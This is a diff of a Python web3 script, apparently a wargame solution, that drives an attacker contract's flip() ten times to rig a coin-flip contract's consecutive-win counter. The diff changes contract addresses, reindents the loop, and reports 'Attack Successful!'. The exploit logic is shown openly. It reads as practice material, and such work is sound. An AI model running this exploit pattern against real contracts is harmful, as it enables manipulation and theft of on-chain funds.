@@ -38,8 +38,8 @@ dict_output = parse_env_to_dict(ENV_PATH)
 
 RPC_URI = dict_output['WEB3_PROVIDER_URI']
 
-CONTRACT_ADDRESS = '0x25B523D2B08e2E164B772C3580a8d7EFC71A9A4C'
-ATTACKER_ADDRESS = '0x0181090eD3cc1954f8635aFfa7f9B87bDbdc8675'
+CONTRACT_ADDRESS = '0x8dAF17A20c9DBA35f005b6324F493785D239719d'
+ATTACKER_ADDRESS = '0x8464135c8F25Da09e49BC8782676a84730C318bC'
 PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']
 
 web3 = Web3(Web3.HTTPProvider(RPC_URI))
@@ -135,36 +135,33 @@ attacker = web3.eth.contract(address=ATTACKER_ADDRESS, abi=ATTACKER_ABI)
 
 TOTAL_WINS = contract.functions.consecutiveWins().call()
 
-print(f"Current Total Wins : {TOTAL_WINS}")
+print(f"Current Total Wins : {TOTAL_WINS}\n")
 
 for _ in range(10):
-    BASE_FEE = web3.eth.get_block('pending')['baseFeePerGas']
-    PRIORITY_FEE = int(BASE_FEE * 0.15 // 1)
-    CURRENT_NONCE = web3.eth.get_transaction_count(USER_ADDRESS)
+  BASE_FEE = web3.eth.get_block('pending')['baseFeePerGas']
+  PRIORITY_FEE = int(BASE_FEE * 0.15 // 1)
+  CURRENT_NONCE = web3.eth.get_transaction_count(USER_ADDRESS)
 
-    # flip 함수 호출하여 동전 면 맞추기
-    data = {
-        'from': USER_ADDRESS,
-        'value': 0,
-        'gas': web3.to_wei("0.000000000001", 'ether'),
-        'maxPriorityFeePerGas': PRIORITY_FEE,
-        'maxFeePerGas': BASE_FEE + PRIORITY_FEE,
-        'nonce': CURRENT_NONCE,
-    }
+  # flip 함수 호출하여 동전 면 맞추기
+  data = {
+      'from': USER_ADDRESS,
+      'value': 0,
+      'gas': web3.to_wei("0.000000000001", 'ether'),
+      'maxPriorityFeePerGas': PRIORITY_FEE,
+      'maxFeePerGas': BASE_FEE + PRIORITY_FEE,
+      'nonce': CURRENT_NONCE,
+  }
 
-    # 트랜젝션 서명 및 전송
-    tx = attacker.functions.flip().build_transaction(data)
-    signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
-    tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
+  # 트랜젝션 서명 및 전송
+  tx = attacker.functions.flip().build_transaction(data)
+  signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
+  tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
 
-    print(f"Transaction Hash: {web3.to_hex(tx_hash)}")
-
-    # 트랜잭션 결과 확인
-    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
-    print(f"Transaction Receipt: {tx_receipt}")
-
-TOTAL_WINS = contract.functions.consecutiveWins().call()
-print(f"Current Total Wins: {TOTAL_WINS}")
+  # 트랜잭션 결과 확인
+  tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
+  
+  TOTAL_WINS = contract.functions.consecutiveWins().call()
+  print(f"Current Total Wins: {TOTAL_WINS}")
 
 if TOTAL_WINS >= 10:
     print("Attack Successful!")
